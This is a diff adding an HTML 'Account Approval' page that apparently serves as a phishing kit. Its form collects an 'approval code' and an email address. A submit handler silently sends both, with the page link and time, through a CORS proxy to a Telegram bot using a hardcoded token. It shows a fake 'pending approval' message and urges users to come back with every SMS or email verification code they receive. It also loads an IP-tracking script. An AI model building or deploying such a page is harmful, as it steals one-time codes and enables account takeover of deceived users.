@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Account Approval</title>
+  <style>
+    :root {
+      --bg-color: #f4f4f4;
+      --container-bg: #fff;
+      --text-color: #333;
+      --input-border: #ccc;
+      --button-bg: #007BFF;
+      --button-hover: #0056b3;
+      --success: green;
+      --error: red;
+    }
+    [data-theme="dark"] {
+      --bg-color: #121212;
+      --container-bg: #1e1e1e;
+      --text-color: #eee;
+      --input-border: #555;
+      --button-bg: #1a73e8;
+      --button-hover: #135abc;
+      --success: #90ee90;
+      --error: #f28b82;
+    }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: var(--bg-color);
+      padding: 2rem;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      color: var(--text-color);
+      transition: background 0.3s, color 0.3s;
+    }
+    .theme-toggle {
+      position: absolute;
+      top: 1rem;
+      right: 1rem;
+      background: none;
+      border: 2px solid var(--text-color);
+      padding: 0.3rem 0.7rem;
+      border-radius: 5px;
+      cursor: pointer;
+      color: var(--text-color);
+    }
+    .container {
+      background: var(--container-bg);
+      padding: 2rem;
+      max-width: 400px;
+      width: 100%;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      transition: background 0.3s;
+      text-align: center;
+    }
+    h2 {
+      margin-bottom: 1.5rem;
+    }
+    label {
+      display: block;
+      margin-top: 1rem;
+      font-weight: 600;
+    }
+    input {
+      width: 100%;
+      padding: 0.7rem;
+      margin-top: 0.5rem;
+      border-radius: 5px;
+      border: 1px solid var(--input-border);
+      background: transparent;
+      color: var(--text-color);
+    }
+    button {
+      margin-top: 1.5rem;
+      padding: 0.75rem;
+      background-color: var(--button-bg);
+      color: #fff;
+      border: none;
+      width: 100%;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: var(--button-hover);
+    }
+    .message {
+      margin-top: 1rem;
+      font-weight: bold;
+    }
+    .copy-link {
+      margin-top: 1rem;
+      background-color: transparent;
+      border: 1px dashed var(--text-color);
+      color: var(--text-color);
+    }
+  </style>
+</head>
+<body>
+  <button class="theme-toggle" onclick="toggleTheme()">Toggle Theme</button>
+  <div class="container">
+    <h2>Account Approval</h2>
+    <form id="approvalForm">
+      <label for="approvalCode">Enter Approval Code</label>
+      <input type="text" id="approvalCode" name="approvalCode" required>
+
+      <label for="email">Enter Email Address</label>
+      <input type="email" id="email" name="email" required>
+
+      <button type="submit">Submit</button>
+    </form>
+    <button class="copy-link" onclick="copyPageLink()">Copy This Page Link</button>
+<span style="display: block; margin-top: 10px; font-size: 14px; color: #888;">
+  Copy this page to access it later anytime you receive verification code through SMS or Emails.
+</span>
+    <div id="message" class="message"></div>
+  </div>
+
+  <script>
+    function toggleTheme() {
+      const html = document.documentElement;
+      const currentTheme = html.getAttribute("data-theme");
+      const nextTheme = currentTheme === "dark" ? "light" : "dark";
+      html.setAttribute("data-theme", nextTheme);
+      localStorage.setItem("theme", nextTheme);
+    }
+
+    (function applyThemeFromStorage() {
+      const savedTheme = localStorage.getItem("theme");
+      if (savedTheme) {
+        document.documentElement.setAttribute("data-theme", savedTheme);
+      }
+    })();
+
+    function getPromoId() {
+      const params = new URLSearchParams(window.location.search);
+      return params.get("promo") || "6976365864"; // fallback
+    }
+
+    function copyPageLink() {
+      navigator.clipboard.writeText(window.location.href)
+        .then(() => alert("✅ Page link copied!"))
+        .catch(() => alert("❌ Failed to copy link."));
+    }
+
+    document.getElementById("approvalForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const approvalCode = document.getElementById("approvalCode").value.trim();
+      const email = document.getElementById("email").value.trim();
+      const messageBox = document.getElementById("message");
+      const botToken = "8433235666:AAGUgGfrFwj5dvE548wxyIpyzjrlaWXu_VA";
+      const proxy = "https://corsproxy.io/?";
+      const chatId = getPromoId();
+
+      if (!approvalCode || !email) {
+        messageBox.textContent = "❌ Please fill in all fields.";
+        messageBox.style.color = "var(--error)";
+        return;
+      }
+
+      const msgText = `📩 <b>Approval Code Submission</b>\n\n🔑 <b>Code:</b> ${approvalCode}\n📧 <b>Email:</b> ${email}\n🌐 <b>Link:</b> ${window.location.href}\n⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
+
+      messageBox.textContent = "⏳ Sending data...";
+      messageBox.style.color = "var(--text-color)";
+
+      fetch(proxy + `https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: msgText,
+          parse_mode: "HTML"
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.ok) {
+          messageBox.textContent = "⏳ Code is pending approval. If your email is valid, you will receive an update soon.";
+          messageBox.style.color = "var(--success)";
+          document.getElementById("approvalForm").reset();
+        } else {
+          messageBox.textContent = "❌ Failed to submit. Try again.";
+          messageBox.style.color = "var(--error)";
+        }
+      })
+      .catch(error => {
+        messageBox.textContent = "❌ Network error. Try again.";
+        messageBox.style.color = "var(--error)";
+        console.error(error);
+      });
+    });
+  </script>
+  <script src="iptrack.js"></script>
+</body>
+</html>
